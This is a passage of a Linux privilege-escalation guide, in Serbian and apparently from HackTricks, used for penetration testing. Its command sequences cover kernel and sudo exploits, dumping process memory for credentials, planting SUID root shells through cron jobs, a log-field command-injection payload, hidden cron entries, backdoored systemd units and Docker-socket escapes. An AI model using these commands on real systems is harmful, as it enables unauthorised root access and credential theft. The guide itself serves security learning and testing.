# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Informacije o sistemu

### Informacije o OS-u

Počnimo da prikupljamo informacije o pokrenutom OS-u.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

Ako **imate dozvole za pisanje u bilo koji folder unutar varijable `PATH`** možda ćete moći da hijack-ujete neke biblioteke ili binarne datoteke:
```bash
echo $PATH
```
### Informacije iz promenljivih okruženja

Ima li zanimljivih informacija, lozinki ili API ključeva u promenljivama okruženja?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proveri verziju kernela i da li postoji neki exploit koji može da se iskoristi za escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobar spisak ranjivih kernela i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Drugi sajtovi gde možete pronaći neke **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izvukli sve verzije ranjivih kernela sa te stranice možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći u pretrazi kernel exploit-a su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (pokreni na victim-u, proverava samo exploits za kernel 2.x)

Uvek **pretraži verziju kernela na Google-u**, možda je tvoja verzija kernela pomenuta u nekom kernel exploit-u i onda ćeš biti siguran da je exploit validan.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo verzija

Na osnovu ranjivih sudo verzija koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo verzije pre 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) omogućavaju neprivilegovanim lokalnim korisnicima da eskaliraju privilegije do root-a putem sudo `--chroot` opcije kada se fajl `/etc/nsswitch.conf` koristi iz direktorijuma koji kontroliše korisnik.

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Pre pokretanja exploita, uverite se da je vaša `sudo` verzija ranjiva i da podržava `chroot` funkcionalnost.

Za više informacija, pogledajte originalni [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg verifikacija potpisa nije uspela

Proveri **smasher2 box of HTB** za **primer** kako bi ovaj vuln mogao biti iskorišćen
```bash
dmesg 2>/dev/null | grep "signature"
```
### Dalja sistemska enumeracija
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Nabrojite moguće odbrane

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ako ste unutar docker container možete pokušati da pobegnete iz njega:


{{#ref}}
docker-security/
{{#endref}}

## Diskovi

Proverite **what is mounted and unmounted**, gde i zašto. Ako je nešto unmounted, možete pokušati da ga mount-ujete i proverite privatne informacije
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Korisni softver

Nabrojte korisne binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proverite да ли je instaliran **bilo који compiler**. Ovo je korisno ako treba da koristite neki kernel exploit, jer se preporučuje da ga compile-ujete na mašini na kojoj ćete ga koristiti (ili na nekoj sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instaliran ranjiv softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji neka stara verzija Nagios (na primer) koja bi mogla biti iskorišćena za escalating privileges…\
Preporučuje se ručno proveriti verziju sumnjivijeg instaliranog softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će većinom biti beskorisne, zato se preporučuju aplikacije poput OpenVAS ili slične koje će proveriti da li je neka instalirana verzija softvera ranjiva na poznate exploits_

## Procesi

Pogledajte **koji procesi** se izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda tomcat koji se izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Takođe **proveri svoje privilegije nad binarima procesa**, možda možeš prepisati nečiji binarni fajl.

### Process monitoring

Možeš koristiti alate kao što je [**pspy**](https://github.com/DominicBreuker/pspy) za praćenje procesa. Ovo može biti vrlo korisno za identifikovanje ranjivih procesa koji se često izvršavaju ili kada su ispunjeni određeni uslovi.

### Process memory

Neki servisi na serveru čuvaju **credentials in clear text inside the memory**.\
Normalno će ti trebati **root privileges** da bi pročitao memoriju procesa koji pripadaju drugim korisnicima, stoga je ovo obično korisnije kada si već root i želiš otkriti više credentials.\
Međutim, zapamti da **kao regularni korisnik možeš čitati memoriju procesa koje poseduješ**.

> [!WARNING]
> Imaj na umu da većina mašina danas **ne dozvoljava ptrace po defaultu**, što znači da ne možeš dump-ovati druge procese koji pripadaju tvom neprivilegovanom korisniku.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB skripta
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati PID, **maps prikazuju kako je memorija mapirana u virtualnom adresnom prostoru tog procesa**; takođe prikazuju i **dozvole za svaku mapiranu regiju**. Pseudo-fajl **mem** **otkriva samu memoriju procesa**. Iz **maps** fajla znamo koje su **memorijske regije readable** i njihove offset-e. Koristimo ove informacije da **seek into the mem file and dump all readable regions** u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` pruža pristup **fizičkoj** memoriji sistema, a ne virtuelnoj memoriji. Virtuelni adresni prostor kernela može se pristupiti korišćenjem /dev/kmem.\
Obično je `/dev/mem` čitljiv samo od strane **root** i **kmem** grupe.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump za linux

ProcDump je za Linux ponovo osmišljena verzija klasičnog alata ProcDump iz paketa alata Sysinternals za Windows. Nabavite ga na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Da biste dump-ovali memoriju procesa, možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti zahteve za root i napraviti dump procesa koji je u vašem vlasništvu
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root je neophodan)

### Kredencijali iz memorije procesa

#### Ručni primer

Ako otkrijete da je proces authenticator pokrenut:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete dump-ovati proces (pogledajte prethodne sekcije za različite načine dumpovanja memorije procesa) i pretražiti credentials u memoriji:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti podatke za prijavu u običnom tekstu iz memorije** i iz nekih **dobro poznatih fajlova**. Za ispravan rad zahteva root privilegije.

| Funkcija                                          | Naziv procesa        |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Pretraga regex-a/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron poslovi

### Crontab UI (alseambusher) koji radi kao root – web-based scheduler privesc

Ako web “Crontab UI” panel (alseambusher/crontab-ui) radi kao root i vezan je samo na loopback, i dalje mu možete pristupiti preko SSH local port-forwardinga i kreirati privilegovani job za eskalaciju.

Tipičan lanac
- Otkrivanje porta dostpnog samo na loopbacku (npr., 127.0.0.1:8000) i Basic-Auth realm pomoću `ss -ntlp` / `curl -v localhost:8000`
- Pronalaženje kredencijala u operativnim artefaktima:
- Backupi/skripte sa `zip -P <password>`
- systemd unit koji izlaže `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunelovanje i prijava:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Kreiraj high-priv job i pokreni odmah (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Koristite ga:
```bash
/tmp/rootshell -p   # root shell
```
Ojačavanje
- Ne pokrećite Crontab UI kao root; ograničite ga sa dedicated user-om i minimalnim permisijama
- Podesite da sluša samo na localhost i dodatno ograničite pristup preko firewall/VPN; nemojte ponovo koristiti passwords
- Izbegavajte ugradnju secrets u unit files; koristite secret stores ili root-only EnvironmentFile
- Omogućite audit/logging za on-demand job executions

Proverite da li je neki scheduled job ranjiv. Možda možete iskoristiti script koji se izvršava od strane root (wildcard vuln? možete li modifikovati fajlove koje root koristi? koristiti symlinks? kreirati specifične fajlove u direktorijumu koji root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron putanja

Na primer, unutar _/etc/crontab_ možete naći PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Napomena: korisnik "user" ima privilegije za pisanje nad /home/user_)

Ako u ovom crontab fajlu root pokuša da izvrši neku komandu ili skript bez podešenog PATH-a. Na primer: _\* \* \* \* root overwrite.sh_\
Tada možete dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron koji koristi skriptu sa wildcard-om (Wildcard Injection)

Ako skripta koja se izvršava kao root sadrži “**\***” unutar komande, to možete iskoristiti da napravite neočekivane stvari (kao privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako je wildcard prethodi putanji kao** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **nije).**

Pročitajte sledeću stranicu za više wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

U Bash-u se parameter expansion i command substitution izvršavaju pre arithmetic evaluation u ((...)), $((...)) i let. Ako root cron/parser čita untrusted log fields i ubacuje ih u arithmetic context, attacker može injektovati command substitution $(...) koji se izvršava kao root kad cron pokrene.

- Why it works: U Bash-u, expansions se dešavaju u sledećem redosledu: parameter/variable expansion, command substitution, arithmetic expansion, zatim word splitting i pathname expansion. Dakle vrednost kao `$(/bin/bash -c 'id > /tmp/pwn')0` se prvo zameni (izvršavajući komandu), a zatim preostali numerički `0` se koristi za arithmetic tako da skripta nastavi bez grešaka.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Ubacite attacker-controlled tekst u parsirani log tako da polje koje liči na broj sadrži command substitution i završava cifrom. Osigurajte da vaša komanda ne ispisuje na stdout (ili je preusmerite) da bi arithmetic ostao validan.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ako **možete izmeniti cron script** koji se izvršava kao root, možete vrlo lako dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako skripta koju root izvršava koristi directory u kojem imate potpuni pristup, možda bi bilo korisno obrisati taj folder i napraviti symlink folder ka drugom koji sadrži script pod vašom kontrolom.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Frequent cron jobs

Možete nadzirati procese da biste pronašli one koji se izvršavaju svakih 1, 2 ili 5 minuta. Možda to možete iskoristiti i eskalirati privilegije.

Na primer, da biste **nadzirali svakih 0.1s tokom 1 minute**, **sortirali po najmanje izvršenim komandama** i obrisali komande koje su se najviše izvršavale, možete uraditi:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Možete takođe koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će nadgledati i izlistati svaki proces koji se pokrene).

### Nevidljivi cron jobs

Moguće je kreirati cronjob **stavljanjem carriage return-a nakon komentara** (bez karaktera novog reda), i cron job će raditi. Primer (obratite pažnju na carriage return karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisi

### Upisive _.service_ datoteke

Proverite da li možete pisati bilo koju `.service` datoteku, ako možete, možete je **izmeniti** tako da **pokrene** vaš **backdoor kada** servis bude **pokrenut**, **ponovo pokrenut** ili **zaustavljen** (možda ćete morati da sačekate da se mašina restartuje).\
Na primer, kreirajte vaš backdoor unutar .service datoteke koristeći **`ExecStart=/tmp/script.sh`**

### Upisivi servisni binarni fajlovi

Imajte na umu da ako imate **dozvole za pisanje nad binarnim fajlovima koje izvršavaju servisi**, možete ih promeniti tako da sadrže backdoors, pa će kada se servisi ponovo budu izvršeni backdoors biti izvršeni.

### systemd PATH - Relativne putanje

Možete videti PATH koji koristi **systemd** pomoću:
```bash
systemctl show-environment
```
Ako otkrijete da možete **pisati** u bilo kojoj od fascikli na toj putanji, možda ćete moći da **escalate privileges**. Treba da tražite **relativne putanje koje se koriste u konfiguracionim fajlovima servisa** kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim, kreirajte **izvršni fajl** sa **istem imenom kao binarna datoteka u relativnom putu** unutar systemd PATH foldera koji možete pisati, i kada se servisu zatraži da izvrši ranjivu akciju (**Start**, **Stop**, **Reload**), vaš **backdoor će biti izvršen** (neprivilegovani korisnici obično ne mogu start/stop servise, ali proverite da li možete da koristite `sudo -l`).

**Saznajte više o servisima pomoću `man systemd.service`.**

## **Timeri**

**Timeri** su systemd unit fajlovi čija imena se završavaju sa `**.timer**` koji kontrolišu `**.service**` fajlove ili događaje. **Timeri** se mogu koristiti kao alternativa za cron jer imaju ugrađenu podršku za događaje na kalendarsko vreme i monotonička vremenska događanja i mogu se pokretati asinhrono.

Možete nabrojati sve timere pomoću:
```bash
systemctl list-timers --all
```
### Tajmeri koji se mogu izmeniti

Ako možete izmeniti tajmer, možete ga naterati da pokrene neke postojeće systemd.unit jedinice (kao što su `.service` ili `.target`)
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je Unit:

> Jedinica koja se aktivira kada istekne ovaj timer. Argument je ime unit-a, čiji sufiks nije ".timer". Ako nije navedeno, ova vrednost podrazumevano pokazuje na service koji ima isto ime kao timer unit, osim sufiksa. (Pogledaj gore.) Preporučuje se da ime jedinice koja se aktivira i ime timer unit-a budu identična, osim sufiksa.

Dakle, da biste zloupotrebili ovu dozvolu, potrebno je da:

- Pronađete neku systemd unit (kao `.service`) koja je **izvršava binarni fajl u koji je moguće pisati**
- Pronađete neku systemd unit koja **izvodi relativnu putanju** i nad kojom imate **privilegije pisanja** nad **systemd PATH** (da imitirate taj izvršni fajl)

**Više o timerima saznajte u `man systemd.timer`.**

### **Omogućavanje timera**

Da biste omogućili timer, potrebne su vam root privilegije i da izvršite:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Obratite pažnju da se **timer** **aktivira** kreiranjem symlink-a ka njemu na `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) omogućavaju **komunikaciju procesa** na istom ili različitim mašinama u okviru client-server modela. Koriste standardne Unix descriptor fajlove za komunikaciju između računara i konfigurišu se preko `.socket` fajlova.

Sockets se mogu konfigurisati koristeći `.socket` fajlove.

**Saznajte više o sockets pomoću `man systemd.socket`.** U ovom fajlu mogu se konfigurisati sledeći interesantni parametri:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije se razlikuju, ali u suštini služe da **naznače gde će socket slušati** (putanja AF_UNIX socket fajla, IPv4/6 i/ili broj porta na kojem će se slušati, itd.)
- `Accept`: Prima boolean argument. Ako je **true**, za svaku dolaznu konekciju se pokreće **instanca servisa** i samo konekcioni socket joj se prosleđuje. Ako je **false**, svi listening sockets sami sebi se **prosleđuju pokrenutom service unit-u**, i samo jedna service unit se pokreće za sve konekcije. Ova vrednost se ignoriše za datagram sokete i FIFO-e gde jedna service unit bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevano je false**. Iz razloga performansi preporučuje se da se novi daemon-i pišu tako da odgovaraju `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Prima jednu ili više komandnih linija, koje se **izvršavaju pre** ili **posle** kreiranja i vezivanja listening **sockets**/FIFO-a, respektivno. Prvi token komandne linije mora biti apsolutno ime fajla, a zatim argumenti za proces.
- `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** ili **posle** zatvaranja i uklanjanja listening **sockets**/FIFO-a, respektivno.
- `Service`: Navodi ime **service** unit-a koji će se **aktivirati** pri **dolaznom saobraćaju**. Ovo podešavanje je dozvoljeno samo za socket-e sa Accept=no. Podrazumevano se koristi service koji ima isto ime kao socket (sa zamenjenim sufiksom). U većini slučajeva nije potrebno koristiti ovu opciju.

### Upisivi .socket fajlovi

Ako pronađete **upisiv** `.socket` fajl, možete **dodati** na početak `[Socket]` sekcije nešto poput: `ExecStartPre=/home/kali/sys/backdoor` i backdoor će biti izvršen pre nego što se socket kreira. Dakle, verovatno ćete morati da sačekate da se mašina restartuje.\
_Napomena: sistem mora koristiti tu konfiguraciju socket fajla, inače backdoor neće biti izvršen_

### Upisivi sockets

Ako **identifikujete bilo koji upisiv socket** (_ovde govorimo o Unix Sockets i ne o konfig `.socket` fajlovima_), onda **možete komunicirati** sa tim socketom i možda iskoristiti neku ranjivost.

### Enumerisanje Unix Sockets
```bash
netstat -a -p --unix
```
### Sirova konekcija
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Imajte na umu da može postojati nekoliko **sockets listening for HTTP** requests (_Ne mislim na .socket files već na fajlove koji se ponašaju kao unix sockets_). Možete to proveriti komandom:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ako socket **odgovara HTTP-om** na request, onda možete **komunicirati** sa njim i možda **exploit some vulnerability**.

### Docker socket dostupan za pisanje

Docker socket, često lociran na `/var/run/docker.sock`, je kritičan fajl koji treba zaštititi. Po defaultu, on je dostupan za pisanje korisniku `root` i članovima `docker` grupe. Imati pristup za pisanje ovom socket-u može dovesti do privilege escalation. Evo pregleda kako se to može uraditi i alternativnih metoda ako Docker CLI nije dostupan.

#### **Privilege Escalation korišćenjem Docker CLI**

Ako imate pristup za pisanje Docker socket-a, možete escalate privileges koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande omogućavaju pokretanje container-a sa root pristupom fajl sistemu hosta.

#### **Using Docker API Directly**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može manipulisati koristeći Docker API i `curl` komande.

1.  **List Docker Images:** Preuzmite listu dostupnih image-ova.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Pošaljite zahtev za kreiranje container-a koji mount-uje root direktorijum host sistema.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Koristite `socat` da uspostavite vezu sa container-om, omogućavajući izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja `socat` konekcije, možete direktno izvršavati komande u container-u sa root pristupom fajl sistemu hosta.

### Ostalo

Imajte u vidu da ako imate prava za pisanje nad docker socket-om zato što ste **inside the group `docker`** imate [**još načina za eskalaciju privilegija**](interesting-groups-linux-pe/index.html#docker-group). Ako [**docker API is listening in a port** možete ga takođe kompromitovati](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Proverite **još načina za izlazak iz docker-a ili zloupotrebu za eskalaciju privilegija** u:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) eskalacija privilegija

Ako otkrijete da možete koristiti **`ctr`** komandu, pročitajte sledeću stranicu jer **možda možete da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** eskalacija privilegija

Ako otkrijete da možete koristiti **`runc`** komandu, pročitajte sledeću stranicu jer **možda možete da je zloupotrebite za eskalaciju privilegija**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticiran sistem inter-procesne komunikacije (IPC) koji omogućava aplikacijama da efikasno komuniciraju i dele podatke. Dizajniran za moderne Linux sisteme, pruža robustan okvir za različite oblike komunikacije između aplikacija.

Sistem je svestran, podržava osnovni IPC koji poboljšava razmenu podataka između procesa, podsećajući na **enhanced UNIX domain sockets**. Takođe pomaže u emitovanju događaja ili signala, omogućavajući besprekornu integraciju među komponentama sistema. Na primer, signal od Bluetooth daemona o dolaznom pozivu može navesti muzički plejer da utiša zvuk, poboljšavajući korisničko iskustvo. Pored toga, D-Bus podržava sistem udaljenih objekata, pojednostavljujući zahteve za servisima i pozive metoda između aplikacija, olakšavajući procese koji su tradicionalno bili složeni.

D-Bus radi na modelu dozvoli/zabrani (allow/deny), upravljajući permisijama poruka (pozivi metoda, emitovanje signala, itd.) na osnovu kumulativnog efekta pravila politike koja se podudaraju. Ove politike određuju interakcije sa bus-om, što potencijalno može dovesti do eskalacije privilegija iskorišćavanjem ovih permisija.

Dat je primer takve politike u /etc/dbus-1/system.d/wpa_supplicant.conf, koji detaljno opisuje permisije za root korisnika da poseduje, šalje i prima poruke od fi.w1.wpa_supplicant1.

Politike bez specificiranog korisnika ili grupe važe univerzalno, dok se "default" kontekst politike primenjuju na sve koji nisu obuhvaćeni drugim specifičnim politikama.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
